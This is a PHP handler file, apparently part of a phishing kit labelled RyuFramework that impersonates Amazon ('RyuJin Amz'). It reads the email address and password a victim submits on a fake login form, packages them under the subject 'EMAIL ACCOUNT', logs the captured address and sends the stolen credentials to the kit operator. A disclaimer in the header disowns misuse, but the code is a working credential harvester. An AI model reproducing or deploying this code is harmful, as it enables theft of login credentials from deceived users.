<?php
/**
* ------------------------------------------------------
* FILE GENERATED FROM RYUCLI ( Wed,14-04-2021 00:28 )
* @filename email.php
* ------------------------------------------------------
*
* @package RyuFramework
* 
* @author shinryu
* @version v1.0-21
* @copyright 2021 shinryujin
*
*
* @disclaimer : 
* This is software for personal use, misuse of this software is not the responsibility of us (the owner). 
* All legal forms are submitted to their respective users 
*
**/
/*** LOG CONFIG FOR STATS ***/
$continue = $this->router('email')['short'];
$type_log = 'email_login';
$desc_log  = 'EMAIL ACCOUNT : '.$_POST['email'];
////////////////////////////

/**** SENDING CONFIG ***/
$type_send = 'email';
$subject_send ='EMAIL ACCOUNT ';
$form_send = 'RyuJin Amz';
////////////////////////



if($this->getPost())
{
    $data = [];

    $email_login = $this->getPost()['email'];
    $data['email_login'] = $email_login; 

    
    $password = $this->getPost()['pass'];
    $data['password'] = $password; 

    
    $type = $this->getPost()['type'];
    $data['type'] = $type; 

    
        $send = ['from' => $form_send,
                'subject' => $subject_send,
                'type' => $type_send,
                'data' => $data
            ];

        $log = ['type' => $type_log,
                'desc' => $desc_log
            ];

        return $this->send($send,$log,$continue);
 
}
